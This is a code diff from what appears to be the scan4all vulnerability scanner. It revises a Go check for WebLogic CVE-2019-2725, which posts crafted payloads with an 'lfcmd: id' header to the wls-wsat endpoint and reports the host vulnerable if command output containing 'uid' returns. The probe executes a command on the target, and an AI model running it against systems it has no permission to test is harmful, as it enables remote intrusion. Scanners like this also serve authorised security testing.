@@ -1,7 +1,6 @@
 package weblogic
 
 import (
-	"fmt"
 	"github.com/hktalent/scan4all/lib/util"
 	"strings"
 )
@@ -70,10 +69,15 @@ func CVE_2019_2725(url string) bool {
 	header["lfcmd"] = "id"
 	header["SOAPAction"] = ""
 	if req, err := util.HttpRequset(url+"/wls-wsat/CoordinatorPortType", "POST", weblogic_10_3_6post_str, false, header); err == nil {
-		if req2, err2 := util.HttpRequset(url+"/wls-wsat/CoordinatorPortType", "POST", weblogic_12_1_3post_str, false, header); err2 == nil {
-			if (req.StatusCode == 200 && util.StrContains(req.Body, "uid")) || (req2.StatusCode == 200 && strings.Contains(req2.Body, "uid")) {
-				util.GoPocLog(fmt.Sprintf("Found vuln Weblogic CVE_2019_2725|%s\n", url))
-				return true
+		if (req.StatusCode == 200 && util.StrContains(req.Body, "uid")) || (req.StatusCode == 200 && strings.Contains(req.Body, "uid")) {
+			util.SendLog(req.RequestUrl, "CVE-2019-2725", "Found vuln Weblogic", weblogic_10_3_6post_str)
+			return true
+		} else {
+			if req2, err2 := util.HttpRequset(url+"/wls-wsat/CoordinatorPortType", "POST", weblogic_12_1_3post_str, false, header); err2 == nil {
+				if (req.StatusCode == 200 && util.StrContains(req.Body, "uid")) || (req2.StatusCode == 200 && strings.Contains(req2.Body, "uid")) {
+					util.SendLog(req.RequestUrl, "CVE-2019-2725", "Found vuln Weblogic", weblogic_12_1_3post_str)
+					return true
+				}
 			}
 		}
 	}
